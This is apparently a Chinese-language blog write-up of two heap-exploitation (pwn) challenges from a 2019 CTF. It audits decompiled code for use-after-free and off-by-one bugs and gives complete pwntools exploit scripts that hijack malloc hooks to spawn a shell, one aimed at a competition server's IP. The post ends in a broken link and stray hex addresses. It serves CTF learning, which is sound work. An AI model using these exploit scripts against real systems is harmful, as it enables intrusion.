---
title: 数字经济云安全CTF
date: 2019-09-24 21:27:08
tags: pwn
---
​	上周末跟着dl们混了一波所谓“数字经济云安全”众测大赛的比赛，最后队内的web师傅和misc师傅发挥神勇，而我和pwn的队友们则拖了后腿，所以只获得50名，着实有些可惜。虽然也算做出了一题半，但落实下来由于各种因素一面flag都没有得到，这值得我深刻反思。下面依次看一下两道pwn的题目。

## amazon

### 审计

#### buy

```c
unsigned __int64 buy()
{
  unsigned int number; // [rsp+4h] [rbp-1Ch]
  size_t nbytes; // [rsp+8h] [rbp-18h]
  __int64 count; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  put_names();
  printf("What item do you want to buy: ");
  __isoc99_scanf("%d", &number);
  if ( number <= 3 )
  {
    printf("How many: ", &number);
    __isoc99_scanf("%lu", &count);
    printf("How long is your note: ", &count);
    __isoc99_scanf("%d", &nbytes);
    if ( (unsigned int)nbytes <= 0x100 )
    {
      for ( HIDWORD(nbytes) = 0; SHIDWORD(nbytes) <= 47 && qword_4080[SHIDWORD(nbytes)]; ++HIDWORD(nbytes) )
        ;
      if ( HIDWORD(nbytes) != 48 )
      {
        qword_4080[SHIDWORD(nbytes)] = (char *)malloc((unsigned int)(nbytes + 40));
        strcpy(qword_4080[SHIDWORD(nbytes)], (&off_4020)[number]);
        printf("Content: ");
        read(0, qword_4080[SHIDWORD(nbytes)] + 32, (unsigned int)nbytes);
        *(_QWORD *)&qword_4080[SHIDWORD(nbytes)][(unsigned int)nbytes + 32] = count;
        puts("Done!");
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```
<!-- more -->
每次malloc的是size+40大小的chunk，都放在data段上。首先用strcpy将硬编码的名字字符串拷贝到chunk上，然后从chunk的0x20开始读入长度不大于0x100字节的内容，最终在chunk的`size+0x20`偏移处写入购买的个数。这里一开始认为存在整数溢出漏洞或者边界控制不当的漏洞，但是一番审计之后发现不存在这种漏洞，所以说该题也就没有直接的溢出漏洞。


#### show

show的时候，直接printf出0x0和0x20处的字符串，而没有判断是否是free的，所以可以借此泄漏libc。

```bash
int show()
{
  char *v0; // rax
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 47; ++i )
  {
    v0 = chunks[i];
    if ( v0 )
      LODWORD(v0) = printf("Name: %s, Note: %s\n", chunks[i], chunks[i] + 32);
  }
  return (signed int)v0;
}
```

#### checkout

free掉对应的chunk，但是明显地存在UAF问题，从而也可以double free或者构造其它的操作。

```c
unsigned __int64 co()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Which item are you going to pay for: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 && v1 <= 48 && chunks[v1] )
    free(chunks[v1]); // 存在UAF
  else
    puts("No such item");
  return __readfsqword(0x28u) ^ v2;
}
```

### 利用

本题leak libc是相当容易的，因为题目中直接就有leak的函数，也不会检查是否被释放，所以直接show即可。

leak完libc和heap addr之后的操作比较难，这里并没有想到如何利用。本题的难点如下：

**虽然存在明显的UAF和double free，但是由于我们只能从堆块的0x20字节以后开始写，所以不能通过double free直接复写tcache堆块的next指针，从而直接实现任意地址分配。**

所以我们可以想到此时只能靠构造overlapping，使得重叠部分足够大，得以溢出修改某个chunk的next指针。不过，比赛时并没有想到如何处理，后来仔细阅读并调试了ChaMD5团队的[writeup](https://mp.weixin.qq.com/s/A0T1VJmfvPcWaBD5ubrbPA)，才茅塞顿开。

让我们直接看exp吧：

#### Leak

```python
add(1,0x10,0x90,"1"*8) 	   # 0

add(1,0x10,0x80,p64(0)) 	 # 1

free(1)

add(1,0x10,0x30,"3"*8) 		 # 2
free(2)
add(1,0x10,0x20,";$0\x00") # 3
add(1,0x10,0x20,"2"*8)		 # 4
free(0)
free(0)

show()
ru("Name: ")
heap=u64(re(6).ljust(8,"\x00"))-0x260 # 此处减去了IO缓冲区申请的堆空间
print hex(heap)

for i in range(6):
    free(0)

show()
ru("Name: ")
lib=u64(re(6).ljust(8,"\x00"))-0x3ebca0
print hex(lib)
```

- add两个chunk，size分别为0xb0和0xa0（会+0x20）
- 将0xa0的chunk放到tcache中。
- add一个0x50的chunk，并放到tcache中，这里是构造将被溢出的chunk，从而实现tcache poisoning
- add两个0x40的chunk
- **free chunk0两次，从而令chunk0放到tcache中，并且自己指向自己，由于tcache是单向链表，所以这时候next指针指向本身。注意tcache的检查很松（至少题目所给的libc-2.27.so版本），所以可以连续free两次**
- 然后调用show方法，leak出堆地址
- **再连续free chunk0六次，前五次会将0xb0的tcache数组填满，从而第六次free的时候，chunk0会被放入unsorted bin中，由于unsorted bin是双向数组，此时chunk0的fd、bk会指向main_arena**
- 再调用show方法，可以leak出堆地址

#### Overlapping

此时的关键点是，chunk0即在tcache中，又在unsorted bin中。而如果再申请相应大小的堆块时，会优先从tcache中取，取完后chunk0的next指针（也就是unsorted bin的fd指针）指向main_arena，所以会再再次申请时会申请到main_arena上去，也就可以修改main_arena的结构了。

main_arena的结构如下：

```c
struct malloc_state {
    /* Serialize access.  */
    __libc_lock_define(, mutex);
    /* Flags (formerly in max_fast).  */
    int flags;
    /* Fastbins */
    mfastbinptr fastbinsY[ NFASTBINS ];
    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top; // top chunk的地址
    /* The remainder from the most recent split of a small request */
    mchunkptr last_remainder;
    /* Normal bins packed as described above */
    mchunkptr bins[ NBINS * 2 - 2 ];
    /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/
    unsigned int binmap[ BINMAPSIZE ];
    /* Linked list, points to the next arena */
    struct malloc_state *next;
    /* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */
    struct malloc_state *next_free;
    /* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */
    INTERNAL_SIZE_T attached_threads;
    /* Memory allocated from the system in this arena.  */
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
};

```

调试时的情况如下：

```
gef➤  x/100gx 0x7f466bc50ca0-96
0x7f466bc50c40 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7f466bc50c50 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7f466bc50c60 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7f466bc50c70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7f466bc50c80 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7f466bc50c90 <main_arena+80>:	0x0000000000000000	0x0000000000000000
0x7f466bc50ca0 <main_arena+96>:	0x00005654b64314c0	0x0000000000000000
0x7f466bc50cb0 <main_arena+112>:	0x00005654b6431250	0x00005654b6431250
0x7f466bc50cc0 <main_arena+128>:	0x00007f466bc50cb0	0x00007f466bc50cb0
0x7f466bc50cd0 <main_arena+144>:	0x00007f466bc50cc0	0x00007f466bc50cc0

```

main_arena的0x0～0x80是fastbin，0x80开始是top chunk，后面是last remainder，之后的首先是unsorted bin，也就是说我们可以分配到`main_arena+122`的地址，而且可以向`main_arena+122+0x20`的地址处确定性的写入，所以我们将某个small_bin的指针修改为我们fake的chunk，从而可以将相应的fake chunk分配出去。而如果这个fake chunk与物理相邻的下一个chunk overlapping，那么bingo！



我们首先将0xa0的chunk再次申请（即预留的chunk1的位置），而且在其中构造一个`fake smallbin chunk`。

```python
add(1,0x10,0x80,"y"*0x60+p64(0)+p64(0x51)+p64(lib+0x3ebce0)*2)
```

- fake_presize = 0
- fake_size = 0x51
- fake_fd = main_arena上相应地址
- fake_fd = main_arena上相应地址

再申请两次，第二次申请时分配到main_arena上，注意尽量保持无关的结构不变。

```python
add(1,0x10,0x90,p64(lib+0x3ebcb0)*2+p64(lib+0x3ebcc0)*2+p64(lib+0x3ebcd0)*2+p64(heap+0x340+0x60)*2)
```

调试可知：

```
gef➤  x/64gx 0x7fc984777c40+96
0x7fc984777ca0 <main_arena+96>:	0x616853206b6c694d	0x000000000000656b
0x7fc984777cb0 <main_arena+112>:	0x0000556633372250	0x0000556633372250
0x7fc984777cc0 <main_arena+128>:	0x00007fc984777cb0	0x00007fc984777cb0 # 
0x7fc984777cd0 <main_arena+144>:	0x00007fc984777cc0	0x00007fc984777cc0 # 
0x7fc984777ce0 <main_arena+160>:	0x00007fc984777cd0	0x00007fc984777cd0 # 这0x30个字节保持原样
0x7fc984777cf0 <main_arena+176>:	0x00005566333723a0	0x00005566333723a0 # smallbin[4]，指向fake chunk
0x7fc984777d00 <main_arena+192>:	0x00007fc984777cf0	0x00007fc984777cf0
0x7fc984777d10 <main_arena+208>:	0x00007fc984777d00	0x00007fc984777d00
0x7fc984777d20 <main_arena+224>:	0x00007fc984777d10	0x00007fc984777d10
0x7fc984777d30 <main_arena+240>:	0x00007fc984777d20	0x00007fc984777d20
0x7fc984777d40 <main_arena+256>:	0x00007fc984777d30	0x00007fc984777d30
0x7fc984777d50 <main_arena+272>:	0x0000000000000010	0x00007fc984777d40 # 写入size 0x10
0x7fc984777d60 <main_arena+288>:	0x00007fc984777d50	0x00007fc984777d50
0x7fc984777d70 <main_arena+304>:	0x00007fc984777d60	0x00007fc984777d60

```

让我们回忆一下CTF Wiki中的tcache机制讲解。

> （1）首先，申请的内存块符合 fastbin 大小时并且找到在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。
>
> （2）其次，申请的内存块符合 smallbin 大小时并且找到在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。
>
> （3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。

所以下次分配0x40时，会分配到fake chunk处（先放入tcache，再从tcache中取），溢出chunk3。而chunk3原本在tcache中，所以可以直接写tcache的next指针，下下次分配0x50的时候分配到任意地址，最终实现任意地址写

#### Hijacking

本题还有第二个难点，就是在劫持控制流的时候有一个大坑。

一般来说，我们会选择覆盖`malloc_hook`或者`free_hook`。本题我们如果选择劫持`__malloc_hook`为one_shot，会发现三个约束条件都不能满足。这时我们一般会想到覆盖`__free_hook`，但是由于`__free_hook`前方是与IO相关的关键数据结构，而我们不得不写入0x20的垃圾字节，这会使得控制流劫持同样失败。

最后还是参考大师傅们的骚操作：选择将`__realloc_hook`覆盖为one_shot，将`__malloc_hook`覆盖为`realloc+9`（跳过函数初始化一堆可能影响栈布局和控制流的push操作）。这样在调用malloc时，会跳转到realloc，而又会再劫持到realloc_hook。同时，这两个的地址在libc上相邻，方便写入。

完整exp如下：

```python
from pwn import *

#context.log_level = 'debug'

p = process('./amazon')
#p=remote("121.41.38.38",9999)
libc=ELF("./libc-2.27.so")

def g(p,data=False):
    gdb.attach(p,data)
    raw_input()

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def rl():
    return p.recvline()

def re(x):
    return p.recv(x)

def add(idx,price,length,data):
    ru("Your choice: ")
    sl(str(1))
    ru("uy: ")
    sl(str(idx))
    ru("many: ")
    sl(str(price))
    ru("note: ")
    sl(str(length))
    ru("tent: ")
    se(data)

def add2(idx,price,length):
    ru("Your choice: ")
    sl(str(1))
    ru("uy: ")
    sl(str(idx))
    ru("many: ")
    sl(str(price))
    ru("note: ")
    sl(str(length))

def show():
    ru("Your choice: ")
    sl(str(2))

def free(idx):
    ru("Your choice: ")
    sl(str(3))
    ru("for: ")
    sl(str(idx))

add(1,0x10,0x90,"1"*8)

add(1,0x10,0x80,p64(0))

free(1)

add(1,0x10,0x30,"3"*8)
free(2)
add(1,0x10,0x20,";$0\x00")
add(1,0x10,0x20,"2"*8)
free(0)
free(0)

show()
ru("Name: ")
heap=u64(re(6).ljust(8,"\x00"))-0x260
print hex(heap)

for i in range(6):
    free(0)

show()
ru("Name: ")
lib=u64(re(6).ljust(8,"\x00"))-0x3ebca0
print hex(lib)

hook=libc.symbols["__malloc_hook"]
hook=lib+hook
print hex(hook)
one=lib+0x10a38c
# one=lib+0x4f2c5
realloc=lib+libc.symbols["realloc"]


add(1,0x10,0x80,"y"*0x60+p64(0)+p64(0x51)+p64(lib+0x3ebce0)*2)

add(1,0x10,0x90,"1"*8)

add(1,0x10,0x90,p64(lib+0x3ebcb0)*2+p64(lib+0x3ebcc0)*2+p64(lib+0x3ebcd0)*2+p64(heap+0x340+0x60)*2)
    
add(1,0x10,0x20,p64(hook-0x28))

add(1,0x10,0x30,"wwe")

add(1,0x10,0x30,p64(one)+p64(realloc+0x9))
    
add2(1,1,0x60)

p.interactive()
```

## fkroman

这题算是我做出来了，防护全开且漏洞很明显，但是缺少leak libc的方法，所以只能爆破。事实上，本题和2018强网杯的一道题基本一摸一样，只不过添加了一个`sleep(5)`恶心你。

我在比赛时搜到本题是`House of Roman`的构造，然后找到一个exp本地可以，最终时间不够未能远程爆破成功，有些遗憾吧。

具体的构造思路实际上非常常规，只不过由于Pie的开启使得随机性过于强。

基本照搬的原来强网杯的exp，就是简单改了改，感兴趣的读者可以去看相应的博客。

```python
# coding:utf-8
from pwn import *
from time import sleep
# elf = ELF("./fkroman")
# p = process("./fkroman",env={"LD_PRELOAD":"./libc-2.23.so"})
p = remote("121.40.246.48", 9999)
def create(size, index):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(size))


def free(index):
	p.recvuntil("choice: ")
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))

def edit(index, content):
	p.recvuntil("choice: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(len(content)))
	p.recvuntil("Content: ")
	p.send(content)
create(0x18,0) # 0x20
create(0xc8,1) # d0
create(0x65,2)  # 0x70

info("create 2 chunk, 0x20, 0xd8")
fake = "A"*0x68
fake += p64(0x61)
edit(1,fake)
info("fake")

free(1)
create(0xc8,1)

create(0x65,3)  # b
create(0x65,15)
create(0x65,18)

over = "A"*0x18  # off by one
over += "\x71"  # set chunk  1's size --> 0x71
edit(0,over)
info("利用 off by one ,  chunk  1's size --> 0x71")

free(2)
free(3)

info("创建两个 0x70 的 fastbin")


heap_po = "\x20"
edit(3,heap_po)
info("把 chunk'1 链入到 fastbin 里面")


# malloc_hook 上方
malloc_hook_nearly = "\xed\x1a"
edit(1,malloc_hook_nearly)

info("部分写，修改 fastbin->fd ---> malloc_hook")


create(0x65,0)
create(0x65,0)
create(0x65,0)

info("0 拿到了 malloc_hook")

free(15)
edit(15,p64(0x00))
info("再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin")

create(0xc8,1)
create(0xc8,1)
create(0x18,2)
create(0xc8,3)
create(0xc8,4)

free(1)
po = "B"*8
po += "\x00\x1b"
edit(1,po)
create(0xc8,1)

info("unsorted bin 使得 malloc_hook 有 libc 的地址")



over = "R"*0x13   # padding for malloc_hook
over += "\xa4\xd2\xbf"
edit(0,over)

info("malloc_hook to one_gadget")

free(18)
free(18)

p.recvuntil("double free or corruption")
p.sendline("\n")
sleep(0.2)

p.sendline("uname -a")
data = p.recvuntil("GNU/Linux", timeout=2)
if "Linux" in data:
    p.interactive()
else:
    exit(0)
```

## 参考链接

[ChaMD5 Writeup](https://mp.weixin.qq.com/s/A0T1VJmfvPcWaBD5ubrbPA)

[某博客](https://xz.aliyun.com/t/2316)

[强网杯原题exp](

7f5bda882000

7f294b801000